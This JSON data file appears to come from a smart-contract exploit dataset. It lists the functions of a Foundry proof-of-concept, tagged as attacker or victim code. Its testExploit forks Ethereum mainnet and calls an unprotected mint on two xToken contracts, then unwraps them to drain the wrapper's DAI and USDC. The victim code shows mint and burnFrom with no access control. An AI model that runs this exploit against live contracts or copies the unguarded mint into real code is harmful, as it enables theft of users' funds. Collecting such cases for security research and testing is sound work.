[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_286_457 - 1);\n        vm.label(address(XTOKEN), \"XTOKEN\");\n        vm.label(address(XTOKEN2), \"XTOKEN2\");\n        vm.label(address(wrapper), \"wrapper\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(USDC), \"USDC\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker DAI balance before attack:\", DAI.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"Attacker USDC balance before attack:\", DAI.balanceOf(address(this)), 18);\n        XTOKEN.mint(address(this), DAI.balanceOf(address(wrapper)));\n        XTOKEN2.mint(address(this), USDC.balanceOf(address(wrapper)));\n        wrapper.unwrap(address(XTOKEN), DAI.balanceOf(address(wrapper)));\n        wrapper.unwrap(address(XTOKEN2), USDC.balanceOf(address(wrapper)));\n        emit log_named_decimal_uint(\"Attacker DAI balance after attack:\", DAI.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"Attacker USDC balance after attack:\", DAI.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXTOKEN",
    "source_type": "victim_contract",
    "function_name": "burnFrom",
    "original_code": "    function burnFrom(address account, uint256 amount) external {\n        _burn(account, amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IXTOKEN",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPROXY",
    "source_type": "victim_contract",
    "function_name": "register",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXTOKENWrapper",
    "source_type": "victim_contract",
    "function_name": "unwrap",
    "original_code": "    function unwrap(address _xToken, uint256 _amount) external returns (bool) {\n        address tokenAddress = xTokenToToken[_xToken];\n        require(tokenAddress != address(0), \"xToken is not registered\");\n        require(_amount > 0, \"amount to wrap should be positive\");\n\n        IXToken(_xToken).burnFrom(_msgSender(), _amount);\n\n        if (tokenAddress != ETH_TOKEN_ADDRESS) {\n            IERC20(tokenAddress).safeTransfer(_msgSender(), _amount);\n        } else {\n            // solhint-disable-next-line\n            (bool sent, ) = msg.sender.call{ value: _amount }(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n\n        return true;\n    }\n}\n",
    "description": ""
  }
]